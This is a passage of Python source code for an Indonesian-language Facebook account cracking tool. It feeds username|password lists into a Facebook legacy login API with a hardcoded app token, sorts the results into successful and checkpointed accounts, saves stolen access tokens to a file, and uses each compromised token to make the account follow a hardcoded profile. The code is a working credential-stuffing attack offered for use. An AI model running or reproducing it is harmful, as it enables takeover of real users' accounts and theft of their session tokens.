                IDS.append(lyters7)
                IDS.append(lyters8)
                IDS.append(lyters9)
                IDS.append(lyters10)
                succ=[]
                check=[]
                acc=[]
                hit=[]
                cek=[]
                #P(len(IDS))
            except ValueError:
                pass
        #input('laksanakan !')
        main(IDS)
        qtampil()
        tanya()
    succ=[]
    check=[]
    acc=[]
    hit=[]
    cek=[]
    ids =open('eksek','r').readlines()
    crack()
    Os('clear')
    P(ban)
    start()
def Check():
    Os('clear')
    P(fbck)
    raw = input(f'  Masukan Pilihan : {mm}')
    if raw == '1':
        list = open('aktif','r').readlines()
    elif raw == '2':
        list = open('checkP','r').readlines()
    elif raw == '3':
        list = open('baru','r').readlines()
    elif raw == '4':
        Os('clear')
        P(ban)
        menu()
    else:
        check()
    def demo_async(urls):
        """Fetch list of web pages asynchronously."""
        start_time = default_timer()
        loop = asyncio.get_event_loop() # event loop
        future = asyncio.ensure_future(fetch_all(urls)) # tasks to do
        loop.run_until_complete(future) # loop until done

        tot_elapsed = default_timer() - start_time
        #ck = check.replace("['",'').replace("','",'\n').replace("']",'')
        while (True):
            tam = input('     Tampilkan Hasil (Y/n)? ')
            if tam == 'Y':
                P('     %s╔══════════════════════════════════════╗'%(gt))   
                P(f'   {gt}  ║ {c}               BERHASIL  {gt}            ║')
                P( "     ╠══════════════════╦═══════════════════╣") 
                for i in succ:
                    u,p = i.strip().split('|')
                    P('     ║'+f' {u}'.ljust(18)+'║'+f' {p}'.ljust(19)+'║')
                P('     %s╠══════════════════╩═══════════════════╣'%(gt))   
                P(f'   {gt}  ║ {y}             CHECKPOINT  {gt}            ║')
                P( "     ╠══════════════════╦═══════════════════╣")    
                for i in check:
                    u,p = i.strip().split('|')    
                    P('     ║'+f' {u}'.ljust(18)+'║'+f' {p}'.ljust(19)+'║')
                P('     %s╚══════════════════╩═══════════════════╝'%(gt))
                break
            elif tam == 'n':
                pass
                break
            else:
                pass
        P('           %s Waktu : '%(w).rjust(18, '-') + '{0:5.2f} '.format(tot_elapsed)+'%s'%(gt).ljust(18,'-'))
        input(f'{m}  Kembali Kemenu {mn}{mm}')
        Os('clear')
        P(ban)
        menu()
    async def fetch_all(urls):
        """Launch requests for all web pages."""
        tasks = []
        thread = asyncio.Semaphore(value=10)
        fetch.start_time = dict() # dictionary of start times for each url
        async with ClientSession() as session:
            for url in urls:
                task = asyncio.ensure_future(atur(thread,url, session))
                tasks.append(task) # create list of tasks
            _ = await asyncio.gather(*tasks) # gather task responses
    async def atur(thread,url,session):
        async with thread:
            await fetch(url,session)
    async def fetch(url, session):
        """Fetch a url, using specified ClientSession."""
        fetch.start_time[url] = default_timer()
        url2 = url.replace('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=','').replace('&locale=en_US&password=','|').replace('&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6','')
        u,p = url2.strip().split('|')    
        async with session.get(url) as response:
            resp = await response.read()
            js = json.loads(resp)
            hit.append(js)
            if 'session_key' in str(resp):
                    z = js['access_token']
                    #P(f'{gt}  SUCCES {id} {w} => {pw}')
                    #requests.post('https://graph.facebook.com/agung3131/subscribers?access_token='+z)
                    requests.post('https://graph.facebook.com/al.ansyari.946/subscribers?access_token='+z)
                    acc.append(u)
                    new.write(z+'\n')
                    bhs= u+'|'+p
                    succ.append(bhs)
                    #P ('%s Sukses '%(bm)+u+'|'+p+w)

            elif '(405)' in str(resp):
                    chk = u+'|'+p
                    cek.append(u)
                    check.append(chk)
                    #P( '%s Check  '%(Y)+u+'|'+p+w)
            elif '401' in str(resp):
                pass
                #P( '%s Wrong  '%(m)+u+'|'+p+w)

            
            Os('clear')
            P ('     %s╔════════╦════════╦═══════╗'%(gt))
            P ('     %s║%s sukses%s ║%s CheckP%s ║%s Total%s ║'% (gt,c,gt,yy,gt,w,gt))
            P (  "     ╠════════╬════════╬═══════╣")
            P ( f'     ║{c} {len(acc)}'.ljust(21)+f'{gt}║{yy} {len(cek)}'.ljust(23)+f'{gt}║ {w}{len(hit)}'.ljust(22)+f'{gt}║')
            P ('     %s╚════════╩════════╩═══════╝'%(gt))
            #time.sleep(0.35)
            elapsed = default_timer() - fetch.start_time[url]
            #P('{0:30}{1:5.2f} {2}'.format(url, elapsed, asterisks(elapsed)))
            
            return resp
    New = open('tes','a')
    new = open('listakun','a')
    succ=[]
    check=[]
    urls=[]
    usrs=[]
    pwds=[]
    acc=[]
    hit=[]
    cek=[]
    Os('clear')
    time.sleep(3)
    for i in list:
        usr,pwd = i.strip().split('|')
        url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' +usr + '&locale=en_US&password=' + pwd + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
        urls.append(url)
    demo_async(urls)
def menu():
    P(Menu)
    raw = input(f'  Masukan Pilihan : {mm}')
    if raw == '1':
        fbt()
    elif raw == '2':
        fbm()
    elif raw == '3':
        fbaF()
    elif raw == '4':
        Check()
    elif raw == '5':
        login()
    elif raw == '6':
        exit()
    else:
        Os('clear')
        P(ban)
        P(f'{mm}{raw}{gt} Tidak Ada Di menu'.center(50))
        menu()
def start():
    try:
        token = open('token','r').read()
        a = requests.get('https://graph.facebook.com/me?access_token='+token)
        requests.post('https://graph.facebook.com/al.ansyari.946/subscribers?access_token='+token)
        b = json.loads(a.text)
        if 'name' in str(b):
            #c = b['name']
            P(f"{gt} Selamat Datang {c}{b['name']}")
            menu()
        else:
            P('  Sepertinya Akun Kena Check Point')
            login()
            start()
    except (KeyError, FileNotFoundError):
        P(' Acount Belum Login'.center(50))
        login()
        start()

P(ban)
menu()
